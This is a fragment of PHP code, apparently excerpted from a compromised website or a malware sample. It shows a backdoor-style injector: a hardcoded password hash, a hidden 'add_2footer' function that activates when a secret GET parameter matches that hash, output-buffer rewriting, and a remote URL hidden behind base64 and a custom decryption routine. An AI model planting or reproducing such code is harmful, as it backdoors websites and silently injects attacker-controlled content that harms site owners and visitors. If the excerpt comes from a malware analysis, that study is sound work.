...
$p = $_POST;
$_passssword = '51a9b194df4a263eba2a4cb2200fd836';
...
function add_2footer() {
    $check = false;
    $check_data = "";
    if (!empty($_GET['check']) AND $_GET['check'] == '51a9b194df4a263eba2a4cb2200fd836') {
        $check = true;
    ...
    if (preg_match($regexp, $buffer, $m)) {
        $body = $m[0];
//        $url = base64_decode('a3d3czksLDEzMC0yOjEtMTY2LTYyLGFvbGQsPHNscXBga2YldnduXHBsdnFgZj41NzEwNDkyMTE3MzYxOTEzNDc=');
        $url = decrypt_url('a3d3czksLDEzMC0yOjEtMTY2LTYyLGFvbGQsPHNscXBga2YldnduXHBsdnFgZj41NzEwNDkyMTE3MzYxOTEzNDc=');
